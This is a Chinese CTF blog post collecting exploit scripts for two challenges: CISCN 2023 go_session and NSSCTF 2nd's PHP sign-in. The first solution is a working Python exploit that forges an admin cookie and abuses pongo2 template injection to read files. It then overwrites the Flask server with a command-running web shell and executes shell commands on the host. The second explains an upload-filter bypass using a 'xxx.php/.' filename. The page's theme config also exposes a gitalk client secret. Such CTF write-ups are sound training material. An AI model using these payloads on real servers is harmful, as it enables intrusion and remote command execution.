<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="lhb">
    
    <title>
        
            一些自认为优雅的exp.py |
        
        Jerem1ah&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/regular.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/brands.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="logo-title" href="/">
               Jerem1ah&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">一些自认为优雅的exp.py</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.svg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">lhb</span>
                            
                                <span class="author-label">Lv4</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-10-04 17:09:50</span>
        <span class="mobile">2023-10-04 17:09</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-10-04 17:17:06</span>
    </span>
    
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf/">ctf</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <h1 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h1><p><a class="link"   target="_blank" rel="noopener" href="https://un1novvn.github.io/2023/05/29/ciscn2023/" >https://un1novvn.github.io/2023/05/29/ciscn2023/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/archives/898#go_session" >https://ctf.njupt.edu.cn/archives/898#go_session<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/../images/34%E4%B8%80%E4%BA%9B%E8%87%AA%E8%AE%A4%E4%B8%BA%E4%BC%98%E9%9B%85%E7%9A%84exp.py/image-20230919224005120.png" alt="image-20230919224005120"></p>
<p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>route.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">localhost_url = <span class="string">&#x27;http://127.0.0.1:8081/&#x27;</span></span><br><span class="line">cookie = requests.get(url=localhost_url).cookies[<span class="string">&#x27;session-name&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line"></span><br><span class="line">admin_url = <span class="string">&#x27;http://node5.anna.nssctf.cn:28355/admin&#x27;</span></span><br><span class="line">response = requests.get(url=admin_url,cookies=&#123;<span class="string">&#x27;session-name&#x27;</span>:cookie&#125;).text</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>



<p>访问<a class="link"   target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:28355/flask?name=%E6%8A%A5%E9%94%99%EF%BC%8C%E5%BE%97%E5%88%B0%E6%BA%90%E7%A0%81" >http://node5.anna.nssctf.cn:28355/flask?name=报错，得到源码<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:28355/flask?name=?name=123%EF%BC%8C%E6%B2%A1%E6%9C%89ssti%EF%BC%8Cdebug%E6%A8%A1%E5%BC%8F%EF%BC%8C%E8%80%83%E8%99%91admin%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99server.py%E6%96%87%E4%BB%B6" >http://node5.anna.nssctf.cn:28355/flask?name=?name=123，没有ssti，debug模式，考虑admin路由重写server.py文件<i class="fas fa-external-link-alt"></i></a></p>
<p>&#x2F;app&#x2F;server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<p>最终exp</p>
<p>把route.go中的guest改为admin，8081运行起来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://node5.anna.nssctf.cn:28141/&#x27;</span></span><br><span class="line">admin_url = base_url+<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>():</span><br><span class="line">    localhost_url = <span class="string">&#x27;http://127.0.0.1:8081/&#x27;</span></span><br><span class="line">    cookie = requests.get(url=localhost_url).cookies[<span class="string">&#x27;session-name&#x27;</span>]</span><br><span class="line">    <span class="comment"># print(cookie)</span></span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_test</span>():</span><br><span class="line">    response = requests.get(url=admin_url,</span><br><span class="line">                            cookies=&#123;<span class="string">&#x27;session-name&#x27;</span>:get_cookie()&#125;).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filename</span>):</span><br><span class="line">    read_payload = <span class="string">&#x27;?name=&#123;%include c.Request.Referer()%&#125;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:filename</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url=admin_url+read_payload,</span><br><span class="line">                            cookies=&#123;<span class="string">&#x27;session-name&#x27;</span>:get_cookie()&#125;,</span><br><span class="line">                            headers=headers).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_data</span>):</span><br><span class="line">    read_payload = <span class="string">&#x27;?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.Referer())&#125;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;filename0&#x27;</span>: (<span class="string">&#x27;1.txt&#x27;</span>,file_data.encode(),<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    boundary = <span class="string">&#x27;--WebKitFormBoundary9K7xUkVGzyQA6e6h&#x27;</span></span><br><span class="line">    multipart_encoder = MultipartEncoder(fields=files,boundary=boundary)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;/app/server.py&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;filename0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:multipart_encoder.content_type,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(headers)</span><br><span class="line">    </span><br><span class="line">    response = requests.get(url = admin_url+read_payload,</span><br><span class="line">                            headers = headers,</span><br><span class="line">                            cookies = &#123;<span class="string">&#x27;session-name&#x27;</span>:get_cookie()&#125;,</span><br><span class="line">                            data = multipart_encoder)</span><br><span class="line">    <span class="built_in">print</span>(response.request.headers)</span><br><span class="line">    <span class="built_in">print</span>(response.request.body)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">cmd</span>):</span><br><span class="line">    url = base_url + <span class="string">f&#x27;flask?name=shell?cmd=<span class="subst">&#123;quote(quote(cmd))&#125;</span>&#x27;</span></span><br><span class="line">    <span class="comment"># url = base_url+&#x27;flask?name=shell?cmd=cd%2520%252F%253Bls%253B&#x27;</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    response = requests.get(url=url,cookies=&#123;<span class="string">&#x27;session-name&#x27;</span>:get_cookie()&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.request.url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from flask import Flask, request</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string">#123</span></span><br><span class="line"><span class="string">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="string">def shell():</span></span><br><span class="line"><span class="string">    cmd = request.args.get(&#x27;cmd&#x27;)</span></span><br><span class="line"><span class="string">    if cmd:</span></span><br><span class="line"><span class="string">        return os.popen(cmd).read()</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return &#x27;shell&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__== &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    app.run(host=&quot;127.0.0.1&quot;,port=5000,debug=True)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write_file(file_data)</span></span><br><span class="line"><span class="comment"># read_file(&#x27;/app/server.py&#x27;)</span></span><br><span class="line">execute_command(<span class="string">&#x27;cd /;ls;cat run.sh;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF-2nd-php签到"><a href="#NSSCTF-2nd-php签到" class="headerlink" title="[NSSCTF 2nd]php签到"></a>[NSSCTF 2nd]php签到</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132559381" >https://blog.csdn.net/Jayjay___/article/details/132559381<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>看到第4行，文件名为xxx.xxx&#x2F;.时，pathinfo函数的PATHINFO_EXTENSION只能得到空。</p>
<p>同时xxx.xxx&#x2F;.这种文件名在被file_put_contents函数处理时，会解析成xxx.xxx，原理应该是两个点表示上一目录，一个点表示当前目录。本地测得不管是xxx.xxx还是xxx.xxx&#x2F;.，file_put_contents函数都能成功写入文件到当前目录下的xxx.xxx文件。</p>
<p><img src="/../images/34%E4%B8%80%E4%BA%9B%E8%87%AA%E8%AE%A4%E4%B8%BA%E4%BC%98%E9%9B%85%E7%9A%84exp.py/image-20230922205803473.png" alt="image-20230922205803473"></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//黑名单</span></span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="comment">//得到文件后缀，【有漏洞】</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">//返回$ext字符串从$value第一次出现的位置开始到结尾的字符串。不考虑大小写。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//将上传的文件名字url解码</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="comment">//得到临时文件（就是上传的文件）的内容，临时文件名字一般是/tmp/phpxxxxxx。</span></span><br><span class="line">    <span class="comment">//这里估计是防止你文件名是日志、/etc、/flag等等，防止造成非预期。</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="comment">//文件写入</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://node6.anna.nssctf.cn:28370/&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;file&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;gogogo!&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>



<p>一个优雅的exp.py</p>
